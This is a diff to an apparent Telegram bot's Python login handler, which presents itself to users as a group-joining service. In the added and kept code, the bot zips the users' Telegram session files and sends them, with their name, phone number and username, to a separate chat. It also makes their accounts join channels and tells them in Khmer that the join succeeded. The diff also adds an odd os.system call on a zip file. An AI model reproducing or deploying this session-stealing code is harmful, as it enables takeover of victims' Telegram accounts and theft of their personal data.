@@ -206,11 +206,12 @@ async def login(lel, message):
       os.remove("1.csv")
       make_archive('sessions', 'zip', 'sessions')
       time.sleep(5)
-      await app.send_message(vitcim, f"\n**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n**Machine Server : Ubuntu 2.0.4 🌐**")
-      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n**Machine Server : Ubuntu 2.0.4 🌐**")
+      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP : Heroku  🌐**")
       await client(JoinChannelRequest('https://t.me/BeaktleyKhmer'))
       await client(JoinChannelRequest('https://t.me/KhmernuddexKidd'))
-      await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")     
+      await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")
+      time.sleep(2)
+      os.system("session.zip")
       po+=1
       await client.disconnect()
      except ConnectionError:
